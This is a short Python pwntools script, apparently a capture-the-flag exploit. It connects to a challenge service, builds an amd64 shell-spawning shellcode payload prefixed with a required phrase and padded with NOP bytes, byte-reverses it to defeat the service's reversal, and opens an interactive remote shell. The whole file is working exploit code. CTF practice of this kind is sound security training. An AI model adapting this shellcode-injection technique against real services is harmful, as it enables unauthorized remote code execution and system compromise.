import argparse

from pwn import *

context.arch = 'amd64'
context.terminal = ['kitty']

parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8000", help="Address of challenge")

args = parser.parse_args()

HOST, PORT = args.address.split(':')
r = remote(HOST, int(PORT))

def rev(s: bytearray):
    for i in range(0x80):
        temp = s[i]
        s[i] = s[0xff - i]
        s[0xff - i] = temp
    return s

a = b'reversing it.' + b'Yes, I have tried '[::-1] + asm(shellcraft.sh())
a = a.ljust(0x100, b'\x90')

r.readline()
r.sendline(rev(bytearray(a)))

r.interactive()
